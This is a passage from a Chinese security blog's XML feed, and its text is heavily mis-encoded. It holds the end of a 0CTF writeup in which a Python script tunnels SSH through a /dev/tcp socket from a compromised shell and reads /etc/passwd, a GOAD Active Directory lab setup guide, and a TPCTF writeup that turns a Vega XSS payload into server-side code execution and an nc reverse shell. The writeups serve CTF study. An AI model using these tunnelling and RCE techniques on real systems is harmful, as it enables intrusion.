æ—¶ï¼Œå¹¶ä¸ä¼šç»™å˜é‡ line èµ‹å€¼ \x00ï¼Œè€Œæ˜¯èµ‹å€¼ â€˜â€˜ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€å­—èŠ‚è¯»å–ï¼Œå¦‚æœä¸ºç©ºçš„è¯ï¼Œå°±ä¸»åŠ¨æ·»åŠ ä¸€ä¸ª \x00ï¼ŒåŒæ—¶ç»™ read æ·»åŠ  -n å’Œ -d å‚æ•°ã€‚ä¸¤è€…ä¸€èµ·ä½¿ç”¨å¯ä»¥è¾¾åˆ°é€å­—èŠ‚è¯»å–çš„ç›®çš„ã€‚ -n å‚æ•°æŒ‡å®šä¸€æ¬¡è¯»å–çš„å­—èŠ‚æ•°ã€‚ -d å‚æ•°å¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦ä¸ºç©ºå­—ç¬¦ã€‚ ```bash #!/bin/bash echo -en â€œ1123\x80\x00\x00\x00\x01\x80â€ | xxd echo -en â€œ1123\x80\x00\x00\x00\x01\x80â€ | while read -r -d â€˜â€™ -n 1 line; do if [[ $line == â€˜â€™ ]] then echo -ne â€œ\x00â€ else echo -ne â€œ$lineâ€ fi done | xxd ![20231211054258](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211054258.png) å½“ç„¶,è¿™é‡Œè¾“å‡ºä¹Ÿå¯ä»¥ä½¿ç”¨ printf. printf å‚æ•° %c å¯ä»¥è¾“å‡ºå•ä¸ªå­—èŠ‚. ```bash echo -en "1123\x80\x00\x00\x00\x01\x80" | xxd echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line; do if [[ $line == '' ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line; do printf "%c" "$line" done | xxd è²Œä¼¼ä¸€æ ·äº†ï¼Œä½†æ˜¯å¦‚æœç”¨äºŒè¿›åˆ¶æ–‡ä»¶æµ‹è¯•çš„è¯ï¼Œè¿˜æ˜¯ä¼šå‘ç°ç»“æœä¸åŒï¼Œå¦‚ä¸‹ã€‚ #!/bin/bash cat /bin/cat | xxd &gt; result_cat cat /bin/cat | while read -r -d '' -n 1 line; do if [[ $line == '' ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd &gt; result_echo cat /bin/cat | while read -r -d '' -n 1 line; do printf "%c" "$line" done | xxd &gt; result_printf ä¾‹å¦‚ \x20 ç»è¿‡ read ä¹‹åä¹Ÿä¼šå˜æˆ â€˜â€˜ã€‚è¿™æ˜¯ç”±äº \x20 ä¸ºç©ºæ ¼ï¼Œå±äº bash ä¸­çš„åˆ†éš”ç¬¦ï¼ˆIFSï¼‰ï¼Œå› æ­¤ç»è¿‡ read ä¹‹åä¹Ÿä¼šå˜æˆ â€˜â€˜ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒIFS çš„å€¼åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ã€‚ ä½† read å¯ä»¥æŒ‡å®š IFS çš„å€¼ã€‚IFS= å¯ä»¥å°†åˆ†éš”ç¬¦è®¾ç½®ä¸º â€˜â€˜ã€‚ #!/bin/bash cat /bin/cat | xxd &gt; result_cat cat /bin/cat | while IFS= read -r -d '' -n 1 line; do if [[ $line == '' ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd &gt; result ä½†è¿™æ ·åˆå‘ç°äº†æ–°çš„ä¸€äº›é—®é¢˜ï¼š printf å’Œ echo çš„è¾“å‡ºåœ¨å¤„ç†æŸäº›å†…å®¹æ—¶è¿˜æ˜¯ä¼šä¸ä¸€è‡´ã€‚ read åœ¨å¤„ç†æŸäº›å­—ç¬¦ä¸²æ—¶ä¼šåæ‰ä¸€éƒ¨åˆ† \x00ã€‚æ¯”å¦‚ï¼šå½“è¾“å…¥å­—ç¬¦ä¸²æœ‰ 3 ä¸ª \x00 ç›¸é‚»æ—¶ï¼Œä¼šè¢«åæ‰ä¸€ä¸ªã€‚ #!/bin/bash echo -en "\xf0\x00\x00\x00\x12\x00" ä¸ç®¡æ˜¯ä½¿ç”¨ printf è¿˜æ˜¯ echo, ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œç›´æ¥è°ƒè¯• bash ä¹Ÿèƒ½å‘ç°æ˜¯ read çš„é—®é¢˜ã€‚ emmmï¼Œå®åœ¨æ˜¯å¾ˆéš¾æ„é€ å‡ºå®Œå…¨ç›¸åŒçš„æ•°æ®ã€‚ç¡¬ç€å¤´çš®è¯•çš„æ—¶å€™çªç„¶å‘ç°ï¼Œprintf %c è¾“å‡ºçš„æ•°æ®æ˜¯å¯ä»¥æ­£å¸¸ç”¨äº ssh é€šä¿¡ï¼Œä½† echo -ne è¾“å‡ºçš„æ•°æ®ä¼šå¯¼è‡´ ssh å¡ä½ã€‚ã€‚ã€‚ã€‚ ç”±æ­¤å¯ä»¥åœ¨ exp2.py çš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ï¼ˆä»…æ ‡æ˜äº†ä¿®æ”¹éƒ¨åˆ†ï¼‰å¾—åˆ° exp3.py # å‘½ä»¤å’Œå‚æ•° command = ["ssh", "ctf@127.0.0.1","-p","4444"] ... listen_port = 5555 ... process.stdin.write(b"exec 3&lt;&gt;/dev/tcp/fourth/22\n") #exec 3&lt;&gt;/dev/tcp/fourth/22 process.stdin.write(b'''while IFS= read -r -d '' -u 3 -n 1 byte ; do printf "%c" "$byte"; done &amp;\n''') process.stdin.flush() ... def trans(bytess): out = [] hex_string = binascii.hexlify(bytess).decode('utf-8') for i in range(len(hex_string)): if i % 2 == 0: out.append('\\x'+hex_string[i:i+2]) connect_cmd = f'''echo -ne "{''.join(out)}" &gt;&amp;3 &amp; \n''' print(connect_cmd) # os.system(connect_cmd) return connect_cmd.encode() ... def socket_write_output(process): while True: ... process.stdin.write(trans(data)) ... ä¾æ¬¡è¿è¡Œ exp.py ~ exp3.py ç„¶åå°±å¯ä»¥é€šè¿‡ 5555 ç«¯å£è¿æ¥ä¸Š fourth äº†ã€‚è¿›å»ä¹‹åæ²¡æœ‰ catã€å¯ä»¥ä½¿ç”¨ exec &lt;/flag4 è¯»å– flagã€‚ æ€»ç»“ï¼šç”±äºå—åˆ° read çš„å½±å“ï¼Œprintf å’Œ echo éƒ½æ²¡æ³•å®Œå…¨è¿˜åŸäºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹ï¼Œä½† printf %c å¯ä»¥æ­£å¸¸ç”¨äº ssh é€šä¿¡ï¼Œä½† echo -ne ä¸è¡Œï¼Œè¿˜å¾—æ ¹æ®å…·ä½“åè®®åˆ†æï¼Œæ·»åŠ æ›´å¤šçš„å­—ç¬¦ä¸²è½¬æ¢æ‰èƒ½å¤Ÿæé«˜å…¼å®¹æ€§ã€‚ åè¯ï¼Œbash åŸç”Ÿå‘½ä»¤ä¸‹ï¼Œå¦‚ä½•å®Œæ•´è·å–äºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹å‘¢ï¼Ÿæˆ‘æ‰¾åˆ°äº† stackexchange ä¸Šçš„ä¸€ä¸ªè§£ç­”ï¼šlinux - bash canâ€™t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange åˆ©ç”¨ readarray å¯ä»¥å°†å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦çš„å†…å®¹å­˜åœ¨æ•°ç»„ä¸­ï¼Œç„¶åå†æ‹¼æ¥è¾“å‡ºã€‚è¿™ç§æ–¹å¼å¯ä»¥å®Œæ•´è·å–ä»»æ„æ–‡ä»¶çš„å®Œæ•´å†…å®¹ï¼Œå³ä½¿æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ readarray -d $'\0' zArray &lt;/etc/passwd [[ "${zArray[*]}" ]] &amp;&amp; printf '%s\0' "${zArray[@]}" ä½†åœ¨è¿™é“é¢˜çš„åœºæ™¯ä¸‹ï¼Œreadarray ä¸å¤ªå¥½ç”¨ï¼Œå¦‚æœç”¨æ¥è¯»å–è¿æ¥ä¸­çš„ fd çš„è¯ï¼Œreadarray ä¼šè¢«é˜»å¡ä½ï¼Œå¯¼è‡´ zArray æ— æ³•è¢«èµ‹å€¼ï¼Œåé¢çš„ printf ä¹Ÿå°±è¯»ä¸å‡ºå†…å®¹ã€‚ è¡¥å……ï¼š å‚è€ƒäº†å…¶ä»–å¤§ä½¬çš„ writeupï¼š ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f Â· mephi42/ctf writeup ä½œè€…é¢å¤–è®¾ç½®äº† LC_ALL ç¯å¢ƒå˜é‡ä¸º Cã€‚ LC_ALL=C LC_ALL ç¯å¢ƒå˜é‡ç”¨äºè¦†ç›–æ‰€æœ‰å…¶ä»–æœ¬åœ°åŒ–è®¾ç½®ï¼Œå®ƒé€šå¸¸ç”¨äºç¡®ä¿åœ¨ç‰¹å®šç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨ç‰¹å®šçš„è¯­è¨€ç¯å¢ƒã€‚C è¯­è¨€ç¯å¢ƒæ˜¯æœ€ç®€å•çš„è¯­è¨€ç¯å¢ƒï¼Œå…¶ä¸­å­—ç¬¦æ˜¯å•å­—èŠ‚çš„ï¼Œå­—ç¬¦é›†æ˜¯ ASCIIï¼Œæ’åºé¡ºåºåŸºäºå­—èŠ‚å€¼ã€‚ åŠ å…¥è¯¥ç¯å¢ƒå˜é‡ä¹‹åï¼Œread å°±ä¸ä¼šå°†å¤šä¸ªå­—ç¬¦è§£ææˆä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä»è€Œè§£å†³ä¸Šé¢ \x00 ç¼ºå¤±çš„é—®é¢˜ï¼Œæµ‹è¯•è„šæœ¬å¦‚ä¸‹ï¼š #!/bin/bash echo -en "\xf0\x00\x00\x00\x12\x00" | xxd echo -en "\xf0\x00\x00\x00\x12\x00" | while LC_ALL=C IFS= read -r -d $'\0' -n 1 line; do printf "%c" "$line" done | xxd echo -en "\xf0\x00\x00\x00\x12\x00" | while LC_ALL=C IFS= read -r -d $'\0' -n 1 line; do if [[ -z $line ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶æ¥æµ‹è¯•ä¹Ÿå¯ä»¥å®Œå…¨ä¸€è‡´ï¼Œå¯ä»¥è¯´å…·å¤‡é€šç”¨æ€§äº†ï¼ å‚è€ƒ HTB: Interface - 0xdf hacks stuff Arithmetic operation in shell script can be exploited - DEV Community linux - bash canâ€™t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f Â· mephi42/ctf]]></summary></entry><entry><title type="html">GOAD é¶åœºç¯å¢ƒæ­å»º</title><link href="/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html" rel="alternate" type="text/html" title="GOAD é¶åœºç¯å¢ƒæ­å»º" /><published>2023-11-28T18:29:48+08:00</published><updated>2023-11-28T18:29:48+08:00</updated><id>/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</id><content type="html" xml:base="/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"><![CDATA[<h1 id="goad-é¶åœºæ­å»º">GOAD é¶åœºæ­å»º</h1>
<p>ä¸‹é¢æ˜¯å®˜æ–¹çš„æ­å»ºæ•™ç¨‹é“¾æ¥ï¼š</p>
<ul>
  <li><a href="https://mayfly277.github.io/posts/GOADv2/">Game Of Active Directory v2</a></li>
</ul>

<p>vagrant ä¸‹è½½å¹¶å¯åŠ¨è™šæ‹Ÿæœºä¸€èˆ¬æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant up
</code></pre></div></div>

<p>ä½†å½“æˆ‘æ‰§è¡Œ ansible çš„å‘½ä»¤æ—¶</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ansible-playbook main.yml
</code></pre></div></div>
<p>æ‰€æœ‰æ¡ç›®éƒ½æ˜¯æŠ¥ No hosts matched, nothing to do çš„é”™è¯¯ã€‚å¯»æ‰¾äº†å…¶ä»–æ•™ç¨‹è²Œä¼¼éƒ½æ²¡æœ‰é‡åˆ°è¿™ç±»çš„é”™è¯¯ï¼š</p>
<ul>
  <li><a href="https://qusec.cn/posts/G0AD/#7-%E6%8E%A8%E8%8D%90-%E5%88%9B%E5%BB%BAubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA-%E5%AE%89%E8%A3%85ansible-%E5%B9%B6%E9%85%8D%E7%BD%AE%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83">åŸŸæ¸—é€é¶åœºGOAD(Game Of Active Directory) v2 æ­å»ºæ•™ç¨‹ - NO SYSTEM IS SAFE</a></li>
  <li><a href="https://guosec.online/posts/ad6be596.html">Windowsä¸‹é…ç½®å®‰è£…GOAD - InfoSecâ€™s Blog</a></li>
</ul>

<p>å‡ ä¸ªå®‰è£…æ•™ç¨‹éƒ½æ˜¯å‡ ä¸ªæœˆä¹‹å‰çš„äº†ï¼Œåœ¨æ­¤æœŸé—´ GOAD æœ‰ä¸€äº›æ›´æ–°ï¼Œæš‚ä¸”ä¸çœ‹æ›´æ–°äº†å“ªäº›å†…å®¹ï¼ŒæŸ¥çœ‹å®˜æ–¹æä¾›çš„å®‰è£…è„šæœ¬ GOAD.shï¼Œåœ¨å…¶ä¸­æœç´¢ ansible-playbook å¯ä»¥æ‰¾åˆ°è¿™ä¸ªè„šæœ¬æ˜¯å¦‚ä½•è¿è¡Œè¿™éƒ¨åˆ†çš„å†…å®¹çš„ï¼š</p>

<p>linux æœ¬åœ°å¯åŠ¨</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>ansible

<span class="nb">export </span><span class="nv">ANSIBLE_COMMAND</span><span class="o">=</span><span class="s2">"ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory"</span>

../scripts/provisionning.sh
</code></pre></div></div>

<p>æ¢ç”¨ä¸Šè¿°çš„å‘½ä»¤å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œäº†ã€‚</p>

<p>å¦‚æœæƒ³ä½¿ç”¨ docker çš„è¯ï¼Œå¯ä»¥å…ˆ build é•œåƒã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker build <span class="nt">-t</span> goadansible <span class="nt">--network</span> host <span class="nb">.</span>
</code></pre></div></div>

<p>ç„¶åè¿è¡Œï¼Œå‘½ä»¤å¦‚ä¸‹</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-ti</span> <span class="nt">--rm</span> <span class="nt">--network</span> host <span class="nt">-h</span> goadansible <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>:/goad <span class="nt">-w</span> /goad/ansible goadansible /bin/bash <span class="nt">-c</span> <span class="s2">"ANSIBLE_COMMAND='ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory' ../scripts/provisionning.sh"</span>
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231128021540.png" alt="20231128021540" /></p>

<p>é…ç½®æœŸé—´å¯èƒ½ä¼šå‡ºç°å„ç§å„æ ·çš„é”™è¯¯ï¼Œè¿™æ—¶å€™åªèƒ½æ±‚åŠ© issue äº†ï¼Œä¸€èˆ¬æ€§çš„é—®é¢˜å…¶ä»–äººä¹Ÿä¼šç¢°åˆ°ï¼š</p>
<ol>
  <li><a href="https://github.com/Orange-Cyberdefense/GOAD/issues/69">Issues Â· Orange-Cyberdefense/GOAD</a></li>
</ol>

<p>æˆ‘é‡åˆ°çš„æ˜¯ SRV02 æ·»åŠ  admin ç”¨æˆ·æ—¶çš„ä¸€ä¸ªæŠ¥é”™ï¼Œåœ¨ issue é‡Œå¯ä»¥çœ‹åˆ°ä¹Ÿæœ‰äººé‡åˆ°è¿‡ç›¸åŒé—®é¢˜ï¼Œä½†æ²¡æœ‰è§£å†³ã€‚</p>
<ul>
  <li>https://github.com/Orange-Cyberdefense/GOAD/issues/62</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231128203931.png" alt="20231128203931" /></p>

<p>æœ€ååªèƒ½è‡ªè¡Œè§£å†³äº†ï¼Œå…·ä½“æ­¥éª¤å¯è§è¯¥ <a href="https://github.com/Orange-Cyberdefense/GOAD/issues/62">issue</a></p>

<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<ul>
  <li><a href="https://qusec.cn/posts/G0AD/#7-%E6%8E%A8%E8%8D%90-%E5%88%9B%E5%BB%BAubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA-%E5%AE%89%E8%A3%85ansible-%E5%B9%B6%E9%85%8D%E7%BD%AE%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83">åŸŸæ¸—é€é¶åœºGOAD(Game Of Active Directory) v2 æ­å»ºæ•™ç¨‹ - NO SYSTEM IS SAFE</a></li>
  <li><a href="https://guosec.online/posts/ad6be596.html">Windowsä¸‹é…ç½®å®‰è£…GOAD - InfoSecâ€™s Blog</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="GOAD" /><category term="Active Directory" /><summary type="html"><![CDATA[GOAD é¶åœºæ­å»º ä¸‹é¢æ˜¯å®˜æ–¹çš„æ­å»ºæ•™ç¨‹é“¾æ¥ï¼š Game Of Active Directory v2 vagrant ä¸‹è½½å¹¶å¯åŠ¨è™šæ‹Ÿæœºä¸€èˆ¬æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚ vagrant up ä½†å½“æˆ‘æ‰§è¡Œ ansible çš„å‘½ä»¤æ—¶ ansible-playbook main.yml æ‰€æœ‰æ¡ç›®éƒ½æ˜¯æŠ¥ No hosts matched, nothing to do çš„é”™è¯¯ã€‚å¯»æ‰¾äº†å…¶ä»–æ•™ç¨‹è²Œä¼¼éƒ½æ²¡æœ‰é‡åˆ°è¿™ç±»çš„é”™è¯¯ï¼š åŸŸæ¸—é€é¶åœºGOAD(Game Of Active Directory) v2 æ­å»ºæ•™ç¨‹ - NO SYSTEM IS SAFE Windowsä¸‹é…ç½®å®‰è£…GOAD - InfoSecâ€™s Blog å‡ ä¸ªå®‰è£…æ•™ç¨‹éƒ½æ˜¯å‡ ä¸ªæœˆä¹‹å‰çš„äº†ï¼Œåœ¨æ­¤æœŸé—´ GOAD æœ‰ä¸€äº›æ›´æ–°ï¼Œæš‚ä¸”ä¸çœ‹æ›´æ–°äº†å“ªäº›å†…å®¹ï¼ŒæŸ¥çœ‹å®˜æ–¹æä¾›çš„å®‰è£…è„šæœ¬ GOAD.shï¼Œåœ¨å…¶ä¸­æœç´¢ ansible-playbook å¯ä»¥æ‰¾åˆ°è¿™ä¸ªè„šæœ¬æ˜¯å¦‚ä½•è¿è¡Œè¿™éƒ¨åˆ†çš„å†…å®¹çš„ï¼š linux æœ¬åœ°å¯åŠ¨ cd ansible export ANSIBLE_COMMAND="ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory" ../scripts/provisionning.sh æ¢ç”¨ä¸Šè¿°çš„å‘½ä»¤å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œäº†ã€‚ å¦‚æœæƒ³ä½¿ç”¨ docker çš„è¯ï¼Œå¯ä»¥å…ˆ build é•œåƒã€‚ docker build -t goadansible --network host . ç„¶åè¿è¡Œï¼Œå‘½ä»¤å¦‚ä¸‹ docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible /bin/bash -c "ANSIBLE_COMMAND='ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory' ../scripts/provisionning.sh" é…ç½®æœŸé—´å¯èƒ½ä¼šå‡ºç°å„ç§å„æ ·çš„é”™è¯¯ï¼Œè¿™æ—¶å€™åªèƒ½æ±‚åŠ© issue äº†ï¼Œä¸€èˆ¬æ€§çš„é—®é¢˜å…¶ä»–äººä¹Ÿä¼šç¢°åˆ°ï¼š Issues Â· Orange-Cyberdefense/GOAD æˆ‘é‡åˆ°çš„æ˜¯ SRV02 æ·»åŠ  admin ç”¨æˆ·æ—¶çš„ä¸€ä¸ªæŠ¥é”™ï¼Œåœ¨ issue é‡Œå¯ä»¥çœ‹åˆ°ä¹Ÿæœ‰äººé‡åˆ°è¿‡ç›¸åŒé—®é¢˜ï¼Œä½†æ²¡æœ‰è§£å†³ã€‚ https://github.com/Orange-Cyberdefense/GOAD/issues/62 æœ€ååªèƒ½è‡ªè¡Œè§£å†³äº†ï¼Œå…·ä½“æ­¥éª¤å¯è§è¯¥ issue å‚è€ƒ åŸŸæ¸—é€é¶åœºGOAD(Game Of Active Directory) v2 æ­å»ºæ•™ç¨‹ - NO SYSTEM IS SAFE Windowsä¸‹é…ç½®å®‰è£…GOAD - InfoSecâ€™s Blog]]></summary></entry><entry><title type="html">TPCTF 2023 graphoid writeup</title><link href="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html" rel="alternate" type="text/html" title="TPCTF 2023 graphoid writeup" /><published>2023-11-27T18:29:48+08:00</published><updated>2023-11-27T18:29:48+08:00</updated><id>/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup</id><content type="html" xml:base="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html"><![CDATA[<p>è¿™ä¸ªé¢˜çš„æ€è·¯å¹¶ä¸æ˜¯å¾ˆæ˜ç¡®ï¼Œç»™å‡ºäº†ä¸€ä¸ª MediaWiki å·²ç»åºŸå¼ƒçš„é¡¹ç›®ï¼š</p>
<ul>
  <li><a href="https://m.mediawiki.org/wiki/Extension:Graph/Graphoid">Extension:Graph/Graphoid - MediaWiki</a></li>
</ul>

<p>Graphoid ç”¨äºå¯¹ç”¨æˆ·æä¾›çš„è¾“å…¥å›¾åƒå®šä¹‰æ–‡ä»¶è¿›è¡Œæ¸²æŸ“ï¼Œè¿”å›å›¾åƒå†…å®¹ã€‚</p>

<p>ç”±äºé¡¹ç›®è¾ƒè€ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ dependency-check å…ˆæ‰«ä¸€éå†å²æ¼æ´ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dependency-check <span class="nt">-s</span> <span class="nb">.</span> <span class="nt">-o</span> report <span class="nt">-f</span> HTML
</code></pre></div></div>
<p>å¾—åˆ°æŠ¥å‘Šä¹‹åå¯ä»¥çœ‹å‡ºå†å²æ¼æ´å¾ˆå¤šï¼Œä½†ä¹‹åç»“åˆä»£ç å®¡è®¡çš„ç»“æœçœ‹å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚</p>

<p>é¡¹ç›®ä½¿ç”¨ nodejs ç¼–å†™ï¼Œé¡¹ç›®éœ€è¦çœ‹çš„ js ä»£ç å¹¶ä¸å¤šï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â””â”€<span class="nv">$ </span>tree  | <span class="nb">grep </span>js
â”œâ”€â”€ app.js
â”‚   â”œâ”€â”€ api-util.js
â”‚   â”œâ”€â”€ swagger-ui.js
â”‚   â”œâ”€â”€ util.js
â”‚   â”œâ”€â”€ vega1.js
â”‚   â”œâ”€â”€ vega2.js
â”‚   â””â”€â”€ vega.js
â”œâ”€â”€ npm-shrinkwrap.json
â”œâ”€â”€ package.json
â”‚   â”œâ”€â”€ graphoid-v1.js
â”‚   â”œâ”€â”€ graphoid-v2.js
â”‚   â”œâ”€â”€ info.js
â”‚   â””â”€â”€ root.js
â”‚   â””â”€â”€ sqlToFiles.js
â”œâ”€â”€ server.js
    â”‚   â”‚   â”œâ”€â”€ app.js
    â”‚   â”‚   â””â”€â”€ spec.js
    â”‚   â”‚   â””â”€â”€ info.js
    â”‚       â””â”€â”€ graph.js
    â”œâ”€â”€ index.js
        â”œâ”€â”€ assert.js
        â”œâ”€â”€ logStream.js
        â””â”€â”€ server.js
</code></pre></div></div>

<p>ä¸»ä½“åŠŸèƒ½åŠå¯¹åº”çš„æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<ol>
  <li>è·¯ç”±åŠŸèƒ½ï¼š
    <ol>
      <li>graphoid-v1.jsï¼šv1 ç‰ˆæœ¬çš„æ¥å£</li>
      <li>graphoid-v2.jsï¼šv2 ç‰ˆæœ¬çš„æ¥å£</li>
    </ol>
  </li>
  <li>æ¸²æŸ“åŠŸèƒ½
    <ol>
      <li>vega.jsï¼šæ ¹æ®è¾“å…¥çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå†³å®šè°ƒç”¨ vega1.js è¿˜æ˜¯ vega2.js è¿›è¡Œæ¸²æŸ“ã€‚</li>
      <li>vega1.js</li>
      <li>vega2.js</li>
    </ol>
  </li>
  <li>swagger æ–‡æ¡£ï¼šè®¿é—® /?doc</li>
  <li>ç³»ç»Ÿä¿¡æ¯ï¼šè®¿é—® /?spec</li>
</ol>

<p>ä¸»ä½“ä»£ç ä¼¼ä¹æ²¡ä»€ä¹ˆæ´ï¼Œå³ä½¿ graphoid-v1 ä¸­æœ‰ä¸€ä¸ª merge æ“ä½œï¼Œä¹Ÿå¹¶ä¸èƒ½é€ æˆ prototype pollutionã€‚</p>

<p>ä»£ç ä¸­ä¼¼ä¹å¯¹ underscore ä¹Ÿè¿›è¡Œäº†è°ƒç”¨ï¼Œunderscore æœ‰ä¸€ä¸ªä»£ç æ‰§è¡Œæ¼æ´ï¼š<a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1081503">Arbitrary Code Injection in org.webjars.npm:underscore - CVE-2021-23358 - Snyk</a>ï¼Œä½†åº”è¯¥å¾—ç»“åˆåŸå‹é“¾æ±¡æŸ“æ‰è¡Œã€‚</p>

<p>è€ƒè™‘åˆ°ä¸»ä½“åŠŸèƒ½è¿˜æ˜¯é€šè¿‡ vega è¿›è¡Œæ¸²æŸ“ï¼Œå› æ­¤å¯ä»¥å» vega çš„ä»“åº“çœ‹çœ‹ issueã€‚æ‰¾åˆ°äº†å‡ ä¸ª xssã€‚å…¶ä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒæœ‰è¶£ï¼š</p>
<ul>
  <li>https://github.com/vega/vega/issues/3018</li>
</ul>

<p>è¿™ä¸ª issue çš„ payload æ›¾åœ¨ hxp2020 hackme è¿™é“é¢˜ä¸­ç”¨äºè§¦å‘ XSSã€‚</p>

<p>ç”±äº Graphoid ä¸­çš„ vega æ¯”è¾ƒè€ï¼Œåº”è¯¥æ˜¯ 3.2.1 ç‰ˆæœ¬ï¼Œå¯ä»¥å…³æ³¨ vega2 çš„ payloadï¼š</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231127212739.png" alt="20231127212739" /></p>

<p>è¿™ä¸ª payload åœ¨ https://vega.github.io/vega-editor/?mode=vega ä¸­æ˜¯å¯ä»¥æ­£å¸¸è§¦å‘ xss çš„ã€‚</p>

<p>è¿™ä¸ª payload åªèƒ½æ˜¯ XSS å—ï¼ŸGraphoid ä¸­çš„ vaga å¯æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯ï¼Œæ—¢ç„¶è¯¥æ¼æ´èƒ½å¤Ÿé€šè¿‡ eval æ‰§è¡Œæ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œé‚£å°±æ˜¯ RCE äº†ã€‚</p>

<p>æµ‹è¯•è¿™ä¸ª poc åç¡®å®å¯ä»¥æ‰§è¡Œä»£ç ï¼Œç¨ä½œæ›´æ”¹å³å¯åå¼¹ shellã€‚ï¼ˆå¹³å°æ›´æ–°äº†ä¸€æ¬¡é™„ä»¶ï¼Œç¬¬ä¸€æ¬¡çš„é™„ä»¶æ­å»ºå‡ºæ¥çš„ç¯å¢ƒï¼Œpng æ¥å£ä¹Ÿå¯ä»¥è§¦å‘ï¼Œä¸”ç¯å¢ƒä¸­æœ‰ curl å¯ä»¥å¸¦å‡ºæ¥ã€‚æ›´æ–°åçš„é™„ä»¶æ­å»ºå‡ºæ¥çš„ç¯å¢ƒï¼Œpng æ¥å£æ€»ä¼šæŠ¥é”™ï¼Œä½† svg æ¥å£å¯ä»¥æ­£å¸¸è§¦å‘ï¼Œå¦å¤–ç¯å¢ƒæ²¡æœ‰ curl äº†ï¼Œä½†æ˜¯æœ‰ busybox å¯ä»¥ nc åå¼¹ shellã€‚</p>

<p>v2 æ¥å£å‘é€å¦‚ä¸‹çš„ payloadã€‚</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"data"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"values"</span><span class="p">:</span><span class="w"> </span><span class="p">[{}],</span><span class="w">
